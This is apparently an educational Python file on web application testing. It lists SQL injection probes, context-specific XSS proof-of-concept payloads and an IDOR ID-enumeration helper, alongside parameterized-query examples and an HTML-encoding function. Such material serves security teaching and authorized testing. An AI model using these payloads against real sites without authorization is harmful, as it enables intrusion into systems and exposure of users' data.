"""
Example: Web Application Hacking
==================================
SQLi payload generator, XSS context analyzer, CSRF PoC, IDOR tester.

IMPORTANT: For authorized security testing and CTF only.
"""

from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import quote


# SQLi Payloads
SQLI_PAYLOADS = [
    ("error-based", "'", "Basic quote test"),
    ("boolean-blind", "' OR '1'='1", "Always-true condition"),
    ("boolean-blind", "' OR '1'='2", "Always-false (comparison)"),
    ("time-blind", "' OR SLEEP(5)--", "MySQL time delay"),
    ("union", "' UNION SELECT NULL--", "Column count detection"),
    ("stacked", "'; SELECT 1--", "Stacked query test"),
]

# XSS Payloads by context
XSS_PAYLOADS = {
    "html_body": [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(document.domain)>',
    ],
    "html_attr": [
        '" onmouseover="alert(document.domain)',
        "' onfocus='alert(document.domain)' autofocus='",
    ],
    "javascript": [
        "';alert(document.domain);//",
        '</script><script>alert(document.domain)</script>',
    ],
}

# IDOR test values
def generate_idor_tests(current_id: int) -> list[int]:
    return [current_id - 1, current_id + 1, 0, 1, -1, current_id * 2, 99999]

# Safe query examples
SAFE_PATTERNS = {
    "sqlite": 'cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))',
    "psycopg2": 'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
    "sqlalchemy": 'db.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})',
}

def html_encode(text: str) -> str:
    for char, entity in [("&","&amp;"),("<","&lt;"),(">","&gt;"),('"',"&quot;"),("'","&#x27;")]:
        text = text.replace(char, entity)
    return text

if __name__ == "__main__":
    print("Web Application Hacking Examples")
    print("=" * 50)
    print("\nSQLi Payloads:")
    for technique, payload, desc in SQLI_PAYLOADS:
        print(f"  [{technique:15s}] {payload}")
    print("\nXSS Payloads (HTML body):")
    for p in XSS_PAYLOADS["html_body"]:
        print(f"  {p}")
    print("\nIDOR test values for ID=42:", generate_idor_tests(42))
    print("\nSafe query patterns:")
    for lib, code in SAFE_PATTERNS.items():
        print(f"  {lib}: {code}")
